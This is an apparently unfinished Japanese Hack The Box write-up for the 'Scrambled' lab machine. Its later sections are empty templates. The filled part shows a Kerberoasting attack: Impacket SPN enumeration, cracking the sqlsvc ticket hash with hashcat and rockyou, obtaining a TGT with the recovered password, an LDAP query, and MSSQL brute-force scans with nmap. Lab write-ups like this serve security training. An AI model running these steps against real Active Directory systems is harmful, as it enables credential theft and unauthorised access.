Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Connecting to 10.129.20.155, port 389, SSL False
[+] Using Kerberos Cache: /home/kali/Desktop/HTB/machine/Scrambled/ksimpson.ccache
[+] SPN LDAP/DC1.SCRM.LOCAL@SCRM.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/SCRM.LOCAL@SCRM.LOCAL
[+] Using TGT from cache
[+] Trying to connect to KDC at 10.129.20.155:88
[+] Connecting to 10.129.20.155, port 636, SSL True
[+] Using Kerberos Cache: /home/kali/Desktop/HTB/machine/Scrambled/ksimpson.ccache
[+] SPN LDAP/DC1.SCRM.LOCAL@SCRM.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/SCRM.LOCAL@SCRM.LOCAL
[+] Using TGT from cache
[+] Trying to connect to KDC at 10.129.20.155:88
[+] Total of records returned 4
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 09:32:02.351452  2025-08-12 01:49:04.598593             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 09:32:02.351452  2025-08-12 01:49:04.598593             



[+] Using Kerberos Cache: /home/kali/Desktop/HTB/machine/Scrambled/ksimpson.ccache
[+] Returning cached credential for KRBTGT/SCRM.LOCAL@SCRM.LOCAL
[+] Using TGT from cache
[+] Username retrieved from CCache: ksimpson
[+] Trying to connect to KDC at 10.129.20.155:88

```

クラックする
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Scrambled]
└─$ hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt        
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu--0x000, 1435/2935 MB (512 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$ccf6e36ccefa132acfb9de7362dba55a$bf2f307ee84b52effc26c9fdba39b080bf85fe393dad04da9076cada47bbf83ca0b2a8ce64eca341392ee5f7dfb8a4e337083f229c808e4ca10f76fef9eec14ada0dee4bf9b7a3b524241c194f0023a8cb8c3853e1d379826b237eac6a6d5478c52f3625e853622815dd068a3d9c3b863728cfc07b0b382c73eca804d00c32c16732e70c11aec143592634669567907b1a112634123cd764a95cecde6b1bf866fd840d7b0276278d48abbc46b20e6e06e68c36dbae48a2077684160c8d3160cbe62457cf83893d27702570df724a1497ede1bc7d266710542c64e887cfe2e040129e82e00da28c186addfd3b23fdfe72ffde0367da5ebce874b49c7e68bc970f8f8d17cdb62a4725735b6889a7807816f6cd5f9007729440a84dc25ba0b75d6f50d5765a5b82e6ede133809951aa8cbe4de884c24593f4afe65753ab3e8fbd33394bb7e217214794594fcf99fbc99828e2a311cacbacef9fec9ebd4d1174ab63058140b693dd63fb81773e9f7998300233ac9ed5e7121a304355c2af429b181ce3191a3910b0866cb57c55c8ce0586e184f22a30bdfe7f875122b8de2305119aa57d08517c77b0b5ca85cc3258df925d889fc9a190060850d5d93bbc5475e19da9bf74ff26f8d19ebca944ca26c4b952ca8a401341313096351d055b3a4432fa43613ffb72affd3bcf0033d3f10bf1a0ae526eebdb2e8f33a03c890a1cb5a787771e9a5a8a4591a5a4bfef8fee385da6b8e87db77137a3b2a1ff9ce8ba33df86cf563f9963e8137d4727a219c776ad8f2c96ff938d4acb5541a61d4c836b627c5bdd39b6b792670d98b432043f54fb3388f05262866e013ece61f75f1e5a5b4a1009a51e95ab9797705a458be4f6b6e80ea6e002ae746d44fe6e0b424544a42b7b9ca27a1f8cdbbd912cb13e8f2483b1e1240de480cb10ed2a33c9f7456aa50cbc8c252d5cd149266d98e16bdb2b5ec848505ed3b2d2d12689afd8db138ef3222a9905fe15750ab70737e0c2f53304053d5d997b6a512767af1e4f1b50b23f47508531948d119288044d4257edabf3c1f4646980fb167aa3e3ecd9e6b73bd2504978d86f06696081ebf43d272a3cdefcf1c62b65685cd9a847a88bab80709d6ffc65defc9842a54e7cf6c77cb0c279632aaf277bfdf7978959fa4a297f49181a3cddfddf70b976ec35b7aaa46f5abdb518aba2576251a9de0cf2c711aed23434fa0c783b72e868dcab2fde67e825f6612b120eea31163d399f66e03e2abe0451dc39d827fb959dc576c9a9aa8576bf876cba0b77191e6f82dacea0d4403cd84cf0eea63b0bfe5a07efeedbb3e62a00af9c80d1a46de86379af154f1a6459de2541235675ab2bb2644b775703cefa9ced2742f59a0702891eb214fa1f3deae559f980ea1eb722819843f89d14f21d62541508c415e544a6654f7333:Pegasus60
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$c...4f7333
Time.Started.....: Tue Aug 12 05:49:27 2025 (8 secs)
Time.Estimated...: Tue Aug 12 05:49:35 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1496.6 kH/s (0.42ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10730496/14344385 (74.81%)
Rejected.........: 0/10730496 (0.00%)
Restore.Point....: 10728960/14344385 (74.80%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Pekqhua* -> Paulis_10

Started: Tue Aug 12 05:49:26 2025
Stopped: Tue Aug 12 05:49:36 2025

```

クラックできた
SQLSVCユーザーのパスワードが、Pegasus60であるとわかった

SQLSVCユーザーのTGTを取得する
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Scrambled]
└─$ impacket-getTGT scrm.local/sqlsvc:Pegasus60 -dc-ip 10.129.20.155
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in sqlsvc.ccache

┌──(kali㉿kali)-[~/Desktop/HTB/machine/Scrambled]
└─$ export KRB5CCNAME="$(pwd)/sqlsvc.ccache"

┌──(kali㉿kali)-[~/Desktop/HTB/machine/Scrambled]
└─$ klist
Ticket cache: FILE:/home/kali/Desktop/HTB/machine/Scrambled/sqlsvc.ccache
Default principal: sqlsvc@SCRM.LOCAL

Valid starting     Expires            Service principal
08/12/25 05:53:33  08/12/25 15:53:33  krbtgt/SCRM.LOCAL@SCRM.LOCAL
        renew until 08/13/25 05:53:31

```

ldapsearchを行う
```sh
ldapsearch -x -H ldap://$Target_IP -D "sqlsvc@DC1.scrm.local" -w 'Pegasus60' -b "DC=scrm,DC=local" "(sAMAccountName=sqlsvc)"
```


## MSSQL
```
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Scrambled]
└─$ sudo nmap -p1433 --script ms-sql-* $Target_IP
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 03:50 PDT
Stats: 0:01:07 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 50.00% done; ETC: 03:52 (0:00:57 remaining)
Stats: 0:02:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 50.00% done; ETC: 03:54 (0:01:57 remaining)
NSE: [ms-sql-brute] passwords: Time limit 10m00s exceeded.
NSE: [ms-sql-brute] passwords: Time limit 10m00s exceeded.
NSE: [ms-sql-brute] usernames: Time limit 10m00s exceeded.
Nmap scan report for scrm.local (10.129.20.155)
Host is up (0.083s latency).

Bug in ms-sql-dac: no string output.
Bug in ms-sql-ntlm-info: no string output.
PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-info: 
|   10.129.20.155:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-brute: 
|   10.129.20.155:1433: 
| [10.129.20.155:1433]
|_  No credentials found
| ms-sql-tables: 
|   10.129.20.155:1433: 
| [10.129.20.155:1433]
|_  ERROR: No login credentials.
| ms-sql-empty-password: 
|_  10.129.20.155:1433: 
| ms-sql-config: 
|   10.129.20.155:1433: 
|_  ERROR: No login credentials
| ms-sql-hasdbaccess: 
|   10.129.20.155:1433: 
|_  ERROR: No login credentials.
| ms-sql-xp-cmdshell: 
|_  (Use --script-args=ms-sql-xp-cmdshell.cmd='<CMD>' to change command.)
| ms-sql-query: 
|_  (Use --script-args=ms-sql-query.query='<QUERY>' to change query.)
| ms-sql-dump-hashes: 
|_  10.129.20.155:1433: ERROR: No login credentials

Nmap done: 1 IP address (1 host up) scanned in 610.38 seconds

```


# Foothold

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```





# Lateral Movement
<横方向の動きに関する説明をここに書いてください>
```bash

```

```bash

```

```bash

```

```bash

```

```bash

```






# Privilege Escalation

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```







## Notes



<このWriteupで特に重要な点や学んだことを追加で記載するセクション>

